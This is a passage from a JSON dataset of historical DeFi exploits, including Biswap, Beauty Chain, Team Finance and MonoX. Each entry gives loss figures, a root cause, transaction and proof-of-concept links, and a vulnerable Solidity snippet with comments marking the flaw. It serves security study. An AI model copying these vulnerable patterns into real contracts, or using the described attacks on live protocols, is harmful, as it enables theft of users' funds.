        "vulnerable_code_snippet": "function donateToReserves(uint subAccountId, uint amount) external nonReentrant {\n        (address underlying, AssetStorage storage assetStorage, address proxyAddr, address msgSender) = CALLER();\n        address account = getSubAccount(msgSender, subAccountId);\n\n        updateAverageLiquidity(account);\n        emit RequestDonate(account, amount);\n\n        AssetCache memory assetCache = loadAssetCache(underlying, assetStorage);\n\n        uint origBalance = assetStorage.users[account].balance;\n        uint newBalance;\n\n        if (amount == type(uint).max) {\n            amount = origBalance;\n            newBalance = 0;\n        } else {\n            require(origBalance >= amount, \"e/insufficient-balance\");\n            unchecked { newBalance = origBalance - amount; }\n        }\n\n        assetStorage.users[account].balance = encodeAmount(newBalance);\n        assetStorage.reserveBalance = assetCache.reserveBalance = encodeSmallAmount(assetCache.reserveBalance + amount);\n\n        emit Withdraw(assetCache.underlying, account, amount);\n        emitViaProxy_Transfer(proxyAddr, account, address(0), amount);\n\n        logAssetStatus(assetCache);\n    }"
    },
    {
        "type": "Access Control",
        "date": "20230630",
        "title": "Biswap",
        "root_cause": "Biswap's V3Migrator contract lacks parameter check, which allows the attacker to steal tokens from the users who approved LP tokens to the V3Migrator contract.",
        "attack_tx": [
            "https://bscscan.com/tx/0xebe5248820241d8de80bcf66f4f1bfaaca62962824efaaa662db84bd27f5e47e",
            "https://bscscan.com/address/0xa1e31b29f94296fc85fac8739511360f279b1976"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Biswap_exp.sol",
        "analysis": "https://twitter.com/MetaTrustAlert/status/1674814217122349056?s=20",
        "vulnerable_code_snippet": "function migrate(MigrateParams calldata params) external override returns (uint refund0, uint refund1) {\n    // burn v2 liquidity to this address\n    IBiswapPair(params.pair).transferFrom(params.pair, params.liquidityToMigrate);\n    (uint256 amount0V2, uint256 amount1V2) = IBiswapPair(params.pair).burn(address(this));\n\n    // calculate the amounts to migrate to v3\n    uint128 amount0V2ToMigrate = uint128(amount0V2);\n    uint128 amount1V2ToMigrate = uint128(amount1V2);\n\n    // approve the position manager up to the maximum amounts\n    safeApprove(params.token, liquidityManager, amount0V2ToMigrate);\n    safeApprove(params.token, liquidityManager, amount1V2ToMigrate);\n\n    // mint v3 position\n    (, uint256 amount0V3, uint256 amount1V3) = ILiquidtyManager(liquidityManager).mint(\n        ILiquidtyManager.MintParam(\n            miner: params.recipient,\n            tokenX: params.token,\n            tokenY: params.token1,\n            fee: params.fee,\n            pl: params.tickLower,\n            xLm: amount0V2ToMigrate,\n            yLm: amount1V2ToMigrate\n        )\n    );\n}"
    },
    {
        "type": "Flashloans, lending",
        "date": "20220616",
        "lost": "$1.26M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220616-inversefinance---flashloan--price-oracle-manipulation",
        "title": "InverseFinance",
        "root_cause": "Incorrect LP price calculation via balanceOf. Insecure way to calculation of LP price via balanceOf in the pool.",
        "vulnerable_code": "https://etherscan.io/address/0xe8b3bc58774857732c6c1147bfc9b9e5fb6f427c#code#L120",
        "analysis": "Insecure way to calculation of LP price via balanceOf in the pool.",
        "vulnerable_code_snippet": "function latestAnswer() public view returns (uint256) {\n        uint256 crvPoolBtcVal = WBTC.balanceOf(address(CRV3CRYPTO)) * uint256(BTCFeed.latestAnswer()) * 1e2; // vulnerable point\n        uint256 crvPoolWethVal = WETH.balanceOf(address(CRV3CRYPTO)) * uint256(ETHFeed.latestAnswer()) / 1e8; // vulnerable point\n        uint256 crvPoolUsdtVal = USDT.balanceOf(address(CRV3CRYPTO)) * uint256(USDTFeed.latestAnswer()) * 1e4; // vulnerable point\n\n        uint256 crvLPTokenPrice = (crvPoolBtcVal + crvPoolWethVal + crvPoolUsdtVal) * 1e18 / crv3CryptoLPToken.totalSupply();\n\n        return (crvLPTokenPrice * vault.pricePerShare()) / 1e18;\n    }"
    },
    {
        "type": "Arbitrary call",
        "date": "20230929",
        "title": "DEXRouter",
        "root_cause": "The attacker exploited 20 BNB from an unverified contract on the BSC network by making arbitrary calls via `functionCallWithValue`.",
        "attack_tx": "https://bscscan.com/tx/0xf77c5904da98d3d4a6e651d0846d35545ef5ca0b969132ae81a9c63e1efc2113",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/DEXRouter_exp.sol"
    },
    {
        "type": "Arbitrage",
        "date": "20230721",
        "title": "SUT",
        "root_cause": "The Root cause  is that the tokenPrice in the tokenPrice() function in the `0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37` contract is much smaller than the token price in the pool.",
        "attack_tx": "https://bscscan.com/tx/0xfa1ece5381b9e2b2b83cb10faefde7632ca411bb38dd6bafe1f1140b1360f6ae",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/SUT_exp.sol",
        "analysis": "https://twitter.com/bulu4477/status/1682983956080377857",
        "lost": "$8k",
        "vulnerable_code_snippet": "function buyTokens(uint256 _numberOfTokens) public payable {\n    uint256 _bnbValue = (_numberOfTokens / 10000000000000000) * tokenPrice;\n    require(msg.value >= _bnbValue, \"Not enough BNB\");\n    require(tokenContract.balanceOf(address(this)) >= _numberOfTokens, \"Not enough tokens\");\n    require(tokenContract.transfer(msg.sender, _numberOfTokens), \"Transfer failed\");\n\n    tokensSold += _numberOfTokens;\n    emit Sell(msg.sender, _numberOfTokens);\n}"
    },
    {
        "type": "Deflationary token, Flashloans",
        "date": "20220529",
        "lost": "279 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220529-novo-protocol---flashloan--price-oracle-manipulation",
        "title": "NOVO Protocol",
        "root_cause": "No sender address validation. There is no sender address validation in the overridden transferFrom function.",
        "analysis": "There is no sender address validation in the overridden transferFrom function",
        "vulnerable_code_snippet": "function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        // locked the NOVO of staking holders\n        uint256 lockedAmount = getLockedAmount(sender);\n        if (lockedAmount > 0) {\n            require(\n                (balanceOf(sender) - amount) >= lockedAmount,\n                \"Your balance was locked\"\n            );\n        }\n        // _approve(  //vulnerable point - commented out\n        //     sender,\n        //     _msgSender(),\n        //     _allowances[sender][_msgSender()].sub(\n        //         amount,\n        //         \"BEP20: transfer amount exceeds allowance\"\n        //     )\n        // );\n        // additional code ...\n    }"
    },
    {
        "type": "Bad randomness",
        "date": "20221205",
        "title": "RFB",
        "root_cause": "Bad randomness. The attacker exploits this vulnerability by purchasing RFB tokens only when they are confident of winning. If their attempt fails, the function reverts, resulting in the attacker losing only the gas cost for the transaction. This strategy allows the attacker to optimize their attempts and minimize potential losses, making the system susceptible to manipulation.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xcc8fdb3c6af8bb9dfd87e913b743a13bbf138a143c27e0f387037887d28e3c7a",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/RFB_exp.sol",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1599991294947778560",
            "https://blog.solidityscan.com/roast-football-hack-analysis-e9316170c443",
            "https://neptunemutual.com/blog/roast-football-lost-funds-through-exploited-reward-system/"
        ],
        "vulnerable_code_snippet": "function randMod(address buyer, uint256 buyamount) internal returns (uint) {\n    uint randnum = uint(keccak256(abi.encodePacked(block.number, block.timestamp, buyer, _balances[pair]))); // vulnerable point\n    uint256 buyBNBamount = buyamount.div(10**_decimals).mul(getPrice());\n    // increase nonce\n    if (randnum % (10000 * luckyMultiplier) == 8888 && buyBNBamount > (0.1 ether)) {\n        distributor.withdrawDistributor(buyer, 79);\n        distributor.withdrawDistributor(marketingFeeReceiver, 9);\n    } else if (randnum % (1000 * luckyMultiplier) == 888) {\n        if (buyBNBamount.mul(100) > 10 ether) {\n            buyBNBamount = 0.1 ether;\n        }\n        try distributor.withdrawPlazz(buyer, buyBNBamount.mul(100).mul(90).div(100)) {} catch {}\n        try distributor.withdrawPlazz(marketingFeeReceiver, buyBNBamount.mul(100).mul(10).div(100)) {} catch {}\n    } else if (randnum % (100 * luckyMultiplier) == 88) {\n        if (buyBNBamount.mul(10) > 10 ether) {\n            buyBNBamount = 1 ether;\n        }\n        try distributor.withdrawPlazz(buyer, buyBNBamount.mul(10).mul(90).div(100)) {} catch {}\n        try distributor.withdrawPlazz(marketingFeeReceiver, buyBNBamount.mul(10).mul(10).div(100)) {} catch {}\n    } else if (randnum % (10 * luckyMultiplier) == 8) {\n        if (buyBNBamount > 10 ether) {\n            buyBNBamount = 10 ether;\n        }\n        try distributor.withdrawPlazz(buyer, buyBNBamount.mul(90).div(100)) {} catch {}\n        try distributor.withdrawPlazz(marketingFeeReceiver, buyBNBamount.mul(10).div(100)) {} catch {}\n    }\n    return randnum;\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20231205",
        "title": "BEARNDAO",
        "root_cause": "The attack exploited a bug in ConvertDustToEarned() and used a sandwich attack.\nRelied on the current balance of the `wantToken` token. But the strategy contract is not supposed to hold a huge amount of dust tokens. The attacker the ALPACA/WBNB pool through large-valued swaps and invoked a call to the convertDustToEarned function, thereby artificially inflating the swap ratio of the tokens. The reverse swap allowed the attacker to perform a sandwich attack, letting them take away approximately $768,358 worth of assets as profits.",
        "attack_tx": [
            "https://www.oklink.com/es-la/bsc/tx/0x51913be3f31d5ddbfc77da789e5f9653ed6b219a52772309802226445a1edd5f",
            "https://explorer.phalcon.xyz/tx/bsc/0x51913be3f31d5ddbfc77da789e5f9653ed6b219a52772309802226445a1edd5f"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/BEARNDAO_exp.sol",
        "analysis": "https://twitter.com/AnciliaInc/status/1732159377749180646",
        "stolen_funds": [
            "0x42df55549558b6119fe9c628b856dec6b86ed4c5",
            "0x4d1f328e0dc4d3e8b7a81184cb89edc4cb7cd63a"
        ],
        "REF_link": "https://neptunemutual.com/blog/how-was-bearn-dao-exploited/",
        "vulnerable_code_snippet": "function convertDustToEarned() public whenNotPaused {\n    require(isAutoComp, \"!isAutoComp\");\n    // Converts dust tokens into earned tokens, which will be reinvested on the next earn().\n\n    // Converts token0 dust (if any) to earned tokens\n    uint256 wantAmt = IERC20(wantAddress).balanceOf(address(this)); // <--vulnerable point \n    if (wantAddress != earnedAddress && wantAmt > 0) {\n        IERC20(wantAddress).safeIncreaseAllowance(uniRouterAddress, wantAmt);\n\n        // Swap all dust tokens to earned tokens\n        IPancakeRouter02(uniRouterAddress).swapExactTokensForTokensSupportingFeeOnTransferTokens(wantAmt, 0, paths[wantAddress][earnedAddress], address(this), now + 60);\n        emit ConvertDustToEarned(wantAddress, earnedAddress, wantAmt);\n    }\n}"
    },
    {
        "type": "Flashloans",
        "date": "20230926",
        "title": "XSDWETHpool",
        "root_cause": "The attacker executed a flash loan, borrowing a large amount of WETH. They swapped WETH to XSD and then swapped XSD back to WETH, transferring the required WETH back to the flash loan provider.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/XSDWETHpool_exp.sol",
        "attack_tx": "0xbdf76f22c41fe212f07e24ca7266d436ef4517dc1395077fabf8125ebe304442",
        "analysis": "https://x.com/CertiKAlert/status/1706765042916450781",
        "vulnerable_code_snippet": "function swapXSDForETH(uint amountOut, uint amountInMax) external override {\n    require(!swap_paused, \"Swaps have been paused\");\n    (uint reserveA, uint reserveB, ) = IXSDWETHpool(XSDWETH_pool_address).getReserves();\n    uint amounts = BankXLibrary.quote(amountOut, reserveB, reserveA);\n    require(amounts <= amountInMax, 'BankXRouter: EXCESSIVE_INPUT_AMOUNT');\n    TransferHelper.safeTransferFrom(\n        xsd_address, msg.sender, XSDWETH_pool_address, amountInMax\n    );\n    XSDWETHpool(XSDWETH_pool_address).swap(0, amountOut, address(this));\n    // function will fail if conditions are not met\n    // XSDWETHpool(XSDWETH_pool_address).flush();\n    IWBNB(WETH).withdraw(amountOut);\n    TransferHelper.safeTransferETH(msg.sender, amountOut);\n    // burn xsd here \n    // value of xsd liquidity pool has to be greater than 20% of the total xsd value\n    if (XSD.totalSupply() - CollateralPool(payable(collateral_pool_address)).collat_XSD() > amountOut / 10 && !pid_controller.bucket1()) {\n        XSD.burnpoolXSD(amountInMax / 10);\n    }\n    refreshPID();\n}"
    },
    {
        "type": "Reentrancy",
        "date": "20240514",
        "title": "PredyFinance",
        "root_cause": "Reentrancy",
        "lost": "$464K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/PredyFinance_exp.sol",
        "attack_tx": "https://arbiscan.io/tx/0xbe163f651d23f0c9e4d4a443c0cc163134a31a1c2761b60188adcfd33178f50f",
        "analysis": "https://predyfinance.medium.com/postmortem-report-on-the-details-of-the-events-of-may-14-2024-8690508c820b",
        "vulnerable_code_snippet": "function trade(\n        GlobalDataLibrary.GlobalData storage globalData,\n        IPredyPool.TradeParams memory tradeParams,\n        bytes memory settlementData\n    ) external returns (IPredyPool.TradeResult memory tradeResult) { // <-- no reentrancy guard\n        DataType.PairStatus storage pairStatus = globalData.pairs[tradeParams.pairId];\n\n        // update interest growth\n        ApplyInterestLib.applyInterestForToken(globalData.pairs, tradeParams.pairId);\n\n        // update rebalance interest growth\n        Perp.updateRebalanceInterestGrowth(pairStatus, pairStatus.sqrtAssetStatus);\n\n        tradeResult = Trade.trade(globalData, tradeParams, settlementData);\n\n        globalData.vaults[tradeParams.vaultId].margin +=\n            tradeResult.fee + tradeResult.payoff.perpPayoff + tradeResult.payoff.sqrtPayoff;\n\n        (tradeResult.minMargin,,, tradeResult.sqrtTwap) = PositionCalculator.calculateMinDeposit(\n            pairStatus, globalData.vaults[tradeParams.vaultId], DataType.FeeAmount(0, 0)\n        );\n\n        // The caller deposits or withdraws margin from the callback that is called below.\n        callTradeAfterCallback(globalData, tradeParams, tradeResult); // <-- vulnerable point\n\n        // check vault safety\n        tradeResult.minMargin =\n            PositionCalculator.checkSafe(pairStatus, globalData.vaults[tradeParams.vaultId], DataType.FeeAmount(0, 0));\n\n        emit PositionUpdated(\n            tradeParams.vaultId,\n            tradeParams.pairId,\n            tradeParams.tradeAmount,\n            tradeParams.tradeAmountSqrt,\n            tradeResult.payoff,\n            tradeResult.fee\n        );\n    }\n    \n    function callTradeAfterCallback(\n        GlobalDataLibrary.GlobalData storage globalData,\n        IPredyPool.TradeParams memory tradeParams,\n        IPredyPool.TradeResult memory tradeResult\n    ) internal {\n        globalData.initializeLock(tradeParams.pairId);\n\n        IHooks(msg.sender).predyTradeAfterCallback(tradeParams, tradeResult); // <-- vulnerable callback point\n\n        (int256 marginAmountUpdate, int256 settledBaseAmount) = globalData.finalizeLock();\n\n        if (settledBaseAmount != 0) {\n            revert IPredyPool.BaseTokenNotSettled();\n        }\n\n        globalData.vaults[tradeParams.vaultId].margin += marginAmountUpdate;\n\n        emit MarginUpdated(tradeParams.vaultId, marginAmountUpdate);\n    }"

    },
    {
        "type": "Deflationary token",
        "date": "20240221",
        "title": "GAIN",
        "root_cause": "The root cause is the implement of $GAIN, the balance in transfer() is calculated by dividing `_gonsPerFragment` for normal account. But different when account is special",
        "attack_tx": "https://etherscan.io/tx/0x7acc896b8d82874c67127ff3359d7437a15fdb4229ed83da00da1f4d8370764e",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/GAIN_exp.sol",
        "analysis": "https://x.com/0xNickLFranklin/status/1760559768241160679",
        "lost": "6.4 ETH",
        "vulnerable_code_snippet": "uint256 gonAmount = amount.mul(_gonsPerFragment);\n_gonBalances[sender] = _gonBalances[sender].sub(gonAmount);\n\nuint256 gonAmountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, gonAmount) : gonAmount;\n_gonBalances[recipient] = _gonBalances[recipient].add(gonAmountReceived);\n\nif (keccak256(abi.encodePacked(_children_of_gainos[recipient])) != keccak256(abi.encodePacked(sideA)) &&\n    keccak256(abi.encodePacked(_children_of_gainos[recipient])) != keccak256(abi.encodePacked(sideB))) {\n    if (_rejoice == true) {\n        _children_of_gainos[recipient] = sideA;\n    } else {\n        children_of_gainos[recipient] = sideB;\n    }\n} ... _totalSupply = INITIAL_FRAGMENTS_SUPPLY;\n_gonBalances[treasuryReceiver] = TOTAL_GONS;\ngonsPerFragment = TOTAL_GONS.div(_totalSupply);\n_lastSnappedTime = block.timestamp;\nautoSnap = false;"
    },
    {
        "type": "Reentrancy",
        "date": "20230721",
        "title": "Conic Finance",
        "root_cause": "Incorrect assumption about the address returned by the Curve element registry for ETH as the underlying for the Curve v2 pool.\nSpecifically, the Conic ETH Omnipool uses the `CurveHandlerV3` to check whether we are currently in a reentrant call. This check was only executed if the pool being interacted with contains ETH, which was checked by calling the `_isETH` method. Our assumption was that Curve v2 pools using ETH have the ETH address (`0xeee\u2026eee`) as one of their coins. However, they instead have the WETH address. This led to `_isETH` returning false, and in turn, to the reentrancy guard of the rETH pool being bypassed.\nAfter bypass the check, attacker can manipulate the price of rETH Curve LP Token.",
        "attack_tx": "https://etherscan.io/tx/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Conic_exp.sol",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1682356244299010049",
            "https://medium.com/@ConicFinance/post-mortem-eth-and-crvusd-omnipool-exploits-c9c7fa213a3d"
        ],
        "lost": "$3.25M",
        "vulnerable_code_snippet": "public override returns (uint256) {\n    // Preparing Withdrawals\n    require(lpToken.balanceOf(msg.sender) >= conicLpAmount, \"insufficient balance\");\n    uint256 underlyingBalanceBefore = underlying.balanceOf(address(this));\n\n    // Processing Withdrawals\n    uint256 totalUnderlying;\n    uint256 allocatedUnderlying;\n    uint256[] memory allocatedPerPool = getTotalAndPerPoolUnderlying();\n    uint256 underlyingToReceive = conicLpAmount.mulDown(_exchangeRate(totalUnderlying));\n    if (underlyingBalanceBefore < underlyingToReceive) {\n        int256 underlyingToWithdraw = underlyingToReceive - underlyingBalanceBefore;\n        _withdrawFromCurve(allocatedUnderlying, allocatedPerPool, underlyingToWithdraw);\n    }\n\n    // Sending Underlying and burning LP Tokens\n    uint256 underlyingWithdrawn = _min(\n        underlying.balanceOf(address(this)),\n        underlyingToReceive\n    );\n    require(underlyingWithdrawn >= minUnder$yingReceived, \"too much slippage\");\n    ipToken.burn(msg.sender, conicLpAmount);\n    underlying.safeTransfer(msg.sender, underlyingWithdrawn);\n    _cachedTotalUnderlying = totalUnderlying - underlyingWithdrawn;\n    _cacheUpdatedTimestamp = block.timestamp;\n}"
    },
    {
        "type": "ERC20, Under/Overflow",
        "date": "20180422",
        "lost": "$900 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20180422-beauty-chain---integer-overflow",
        "title": "Beauty Chain",
        "root_cause": "Arithmetic Overflow",
        "analysis": "The vulnerable code snippet shows an arithmetic overflow when calculating the total amount to be transferred. The line `uint256 amount = uint256(cnt) * _value;` multiplies the number of recipients (`cnt`) by the transfer value (`_value`). If `cnt` is large enough and `_value` is significant, the result could overflow the uint256 data type, leading to an incorrect calculation of the amount transferred.",
        "vulnerable_code_snippet": "function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\n    uint cnt = _receivers.length;\n    uint256 amount = uint256(cnt) * _value; // vulnerable point\n    require(cnt > 0 && cnt <= 20);\n    require(_value > 0 && balances[msg.sender] >= amount);\n\n    balances[msg.sender] = balances[msg.sender].sub(amount);\n    for (uint i = 0; i < cnt; i++) {\n        balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n        Transfer(msg.sender, _receivers[i], _value);\n    }\n    return true;\n}"
    },
    {
        "type": "Donate, Oracle",
        "date": "20230428",
        "lost": "$2M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/0vix_exp.sol",
        "title": "0vix",
        "root_cause": "Incorrect use balanceOf.",
        "attack_tx": "https://polygonscan.com/tx/0x10f2c28f5d6cd8d7b56210b4d5e0cece27e45a30808cd3d3443c05d4275bb008",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1651932529874853888",
            "https://twitter.com/peckshield/status/1651923235603361793",
            "https://twitter.com/Mudit__Gupta/status/1651958883634536448"
        ],
        "vulnerable_code_snippet": "function totalGHST(address _user) public view returns (uint _totalGHST) {\n    uint totalGHSTheld = GHST.balanceOf(_user);   // vulnerable point\n    _totalGHST = totalGHSTheld + totalGHSTStaked + totalwapGHSTheld;\n}\n\nfunction convertVGHST(uint _share) public view returns (uint _ghst) {\n    uint totalTokenLocked = totalGHST(address(this)); // vulnerable point\n    _ghst = _share * totalTokenLocked / totalShares;\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20221027",
        "lost": "$15.8M",
        "POC":  "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/TeamFinance.exp.sol",
        "title": "Team Finance",
        "root_cause": "In `migrate` function, the validation on `MigrateParams` is the function's input value.",
        "attack_tx": "https://etherscan.io/tx/0xb2e3ea72d353da43a2ac9a8f1670fd16463ab370e563b9b5b26119b2601277ce",
        "analysis": [
            "https://twitter.com/TeamFinance_/status/1585770918873542656",
            "https://twitter.com/peckshield/status/1585587858978623491",
            "https://twitter.com/solid_group_1/status/1585643249305518083",
            "https://twitter.com/BeosinAlert/status/1585578499125178369"
        ],
        "vulnerable_code_snippet": "/**\n     * migrate liquidity from v2 to v3\n     */\n    function migrate(\n        uint256 _id,\n        IV3Migrator.MigrateParams calldata params,\n        bool noLiquidity,\n        uint160 sqrtPriceX96,\n        bool _mintNFT\n    )\n    external\n    payable\n    whenNotPaused\n    nonReentrant\n    {\n        require(address(nonfungiblePositionManager) != address(0), \"NFT manager not set\");\n        require(address(v3Migrator) != address(0), \"v3 migrator not set\");\n        Items memory lockedERC20 = lockedToken[_id];\n        require(block.timestamp < lockedERC20.unlockTime, \"Unlock time already reached\");\n        require(_msgSender() == lockedERC20.withdrawalAddress, \"Unauthorised sender\");\n        require(!lockedERC20.withdrawn, \"Already withdrawn\");\n\n        uint256 totalSupplyBeforeMigrate = nonfungiblePositionManager.totalSupply();\n        \n        // scope for solving stack too deep error\n        {\n            uint256 ethBalanceBefore = address(this).balance;\n            uint256 token0BalanceBefore = IERC20(params.token0).balanceOf(address(this));\n            uint256 token1BalanceBefore = IERC20(params.token1).balanceOf(address(this));\n            \n            // initialize the pool if not yet initialized\n            if(noLiquidity) {\n                v3Migrator.createAndInitializePoolIfNecessary(params.token0, params.token1, params.fee, sqrtPriceX96);\n            }\n\n            IERC20(params.pair).approve(address(v3Migrator), params.liquidityToMigrate);\n\n            v3Migrator.migrate(params);\n\n            // refund eth or tokens\n            uint256 refundEth = address(this).balance - ethBalanceBefore;\n            (bool refundSuccess,) = _msgSender().call{value: refundEth}(\"\"\");\n            require(refundSuccess, 'Refund ETH failed');\n\n            uint256 token0BalanceAfter = IERC20(params.token0).balanceOf(address(this));\n            uint256 refundToken0 = token0BalanceAfter - token0BalanceBefore;\n            if(refundToken0 > 0) {\n                require(IERC20(params.token0).transfer(_msgSender(), refundToken0));\n            }\n\n            uint256 token1BalanceAfter = IERC20(params.token1).balanceOf(address(this));\n            uint256 refundToken1 = token1BalanceAfter - token1BalanceBefore;\n            if(refundToken1 > 0) {\n                require(IERC20(params.token1).transfer(_msgSender(), refundToken1));\n            }\n        }\n\n        // remove old locked token details\n        _removeERC20Deposit(_id);\n\n        // Get the token id of newly generated nft for v3\n        uint256 totalSupplyAfterMigrate = nonfungiblePositionManager.totalSupply();\n        require(totalSupplyAfterMigrate == totalSupplyBeforeMigrate.add(1));\n        uint256 tokenIndex = totalSupplyAfterMigrate.sub(1);\n        uint256 tokenId = nonfungiblePositionManager.tokenByIndex(tokenIndex);\n\n        // add new locked nft details (received after migrating liquidity)\n        uint256 newDepositId = ++depositId;\n        _addNFTDeposit(_id, newDepositId, tokenId);\n\n        listMigratedDepositIds[newDepositId] = _id;\n\n        if (_mintNFT) {\n            require(NFT != address(0), 'NFT: Uninitialized');\n            nftMinted[newDepositId] = true;\n        }\n\n        if (nftMinted[_id]) {\n            nftMinted[_id] = false;\n            IERC721Extended(NFT).burn(_id);\n        }\n        if (_mintNFT) {\n            IERC721Extended(NFT).mintLiquidityLockNFT(_msgSender(), newDepositId);\n        }\n        \n        emit LiquidityMigrated(_msgSender(), _id, newDepositId, tokenId);\n    }"

    },
    {
        "type": "Price Manipulation",
        "date": "20231013",
        "title": "BelugaDex",
        "lost": "$175K",
        "root_cause": "In the `_withdrawFrom` function, the value `liabilityToBurn` is determined by the `asset.liability` and `asset.totalSupply`. However, the actual exchange/swap process is using the oracle as price feed. This introduces inconsistency for arbitrage. Attacker could deposit `USDT` token, swap them to `USDCE` using oracle price(however the `liability` is influenced), but during the withdraw process which uses asset liability, the attacker could get back more assets than the original deposit tokens.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/BelugaDex_exp.sol",
        "attack_tx": "https://arbiscan.io/tx/0x57c96e320a3b885fabd95dd476d43c0d0fb10500d940d9594d4a458471a87abe",
        "analysis": [
            "https://twitter.com/AnciliaInc/status/1712676040471105870",
            "https://twitter.com/CertiKAlert/status/1712707006979613097"
        ],
        "vulnerable_code_snippet": "function _withdrawFrom(Asset asset, uint256 liquidity) private view returns (\n        uint256 amount,\n        uint256 liabilityToBurn,\n        uint256 fee,\n        bool enoughCash\n    ) {\n        liabilityToBurn = (asset.liability() * liquidity) / asset.totalSupply();\n        require(liabilityToBurn > 0, 'INSUFFICIENT_LIQ_BURN');\n        ...\n    }"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240508",
        "lost": "32K USD",
        "title": "GPU",
        "root_cause": "self transfer. The root cause of the exploit was due to the _balance update logic, which did not properly account for transactions where the sender and recipient were the same. This allowed the attacker to manipulate their own token balance by performing self-transfers. During these self-transfers, the smart contract under the hood overwrote the sender's balance (_balances[sender]) with what should have been the recipient's balance (_balances[recipient]). Since the sender and recipient were the same, this resulted in artificially inflated balances without any real token inflow. By continuously initiating self-transfers, the attacker was able to repeatedly overwrite and increase their balance, leading to unauthorized token acquisition and a total loss of 32K USD.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/GPU_exp.sol",
        "attack_tx": [
            "https://bscscan.com/tx/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb",
            "https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb"
        ],
        "analysis": "https://blog.solidityscan.com/gpu-hack-analysis-bf11f7c00534",
        "screenshot": "![Screenshot 2024-07-03 at 5.32.35\u202fPM.png](Self%20transfer%208267a353c38a42ddb394c0f5dc5598bc/Screenshot_2024-07-03_at_5.32.35_PM.png)",
        "vulnerable_code_snippet": "function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        uint256 senderAmount = _balances[sender]; // <-- vulnerable point\n        uint256 recipientAmount = _balances[recipient]; // <-- vulnerable point\n        require(senderAmount >= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderAmount.sub(amount);\n        _balances[recipient] = recipientAmount.add(amount); // <-- vulnerable point\n        emit Transfer(sender, recipient, amount);\n    }"

    },
    {
        "type": "Business Logic Flaw",
        "date": "20240320",
        "lost": "24K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Paraswap_exp.sol",
        "title": "Paraswap",
        "root_cause": "When contract is handling of external callback functions, the contract allowed unauthorized redirection of funds.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x35a73969f582872c25c96c48d8bb31c23eab8a49c19282c67509b96186734e60",
        "analysis": "https://medium.com/neptune-mutual/analysis-of-the-paraswap-exploit-1f97c604b4fe",
        "vulnerable_code_snippet": "// Check if fromAddress is this contract\nlet fromAddress := calldataload(164)\n\nswitch eq(fromAddress, address())\n// If fromAddress is this contract, execute transfer()\ncase 1 {\n    // Prepare external call data\n    ...\n}\n// If fromAddress is not this contract, execute transferFrom() or permitTransferFrom()\ndefault {\n    switch isPermit2\n    ...\n}\n\nif eq(fromAddress, address())\n// If fromAddress is this contract, execute transfer()\ncase 1 {\n    ...\n}\n// If fromAddress is not this contract, execute transferFrom() or permitTransferFrom()\ndefault {\n    ...\n}"
    },
    {
        "type": "Dex/AMM",
        "date": "20211130",
        "lost": "$31 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20211130-monox-finance---price-manipulation",
        "title": "MonoX Finance",
        "root_cause": "Insufficient validation. Due to to is controllable, attacker can remove anyone's liquidity. Attack can input tokenIn and tokenOut with same token because of without any validation. so attacker can perform multiple swap to manipulate the token price.",
